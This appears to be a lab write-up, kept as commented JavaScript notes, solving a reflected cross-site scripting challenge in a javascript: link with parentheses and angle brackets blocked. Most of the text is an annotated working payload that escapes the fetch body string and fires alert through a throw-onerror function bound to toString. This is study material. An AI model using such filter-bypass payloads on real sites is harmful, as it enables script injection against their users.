/*

open a post 
we find that there is a reflection point in the source: 

<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
                                                            ||||||||||||||||||||||            
we need to escape the body key in the JSON and inject our own key elements to the JSON

since < gets encoded we can't use HTML tags

x = x ==> {
    throw onerror=alert,1337
}

toString=x;     the toString function has become the x function
toString();     we can't execute our x function because () is blocked

window+'';
/*
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:' 
*/

/*   original reflection in the source

javascript:fetch(
    '/analytics', 
    {
        method:'post',
        body:'//post?postId=2'
    }
).finally(_ => window.location = '/')

*/
// ---------- /**/ force space
// ---------- x can't be executed with x() as () are blocked
//  manipulated injection ======>

javascript:fetch(
    '/analytics', 
    {
        method:'post',
        body:'/post?postId=2&'  //starts from & tells the browser theres more parameters ahead
    },
    x=x=>{
        throw/**/onerror=alert,1337     //force space and onerror alert 1337
    },
    toString=x,           //making x executale using toString keyword
    window+'',             //this makes the website call our toString function
    {
        x:''            //our injection ends at x:'
    }                   //the x can be replaced by any letter
).finally(_ => window.location = '/')







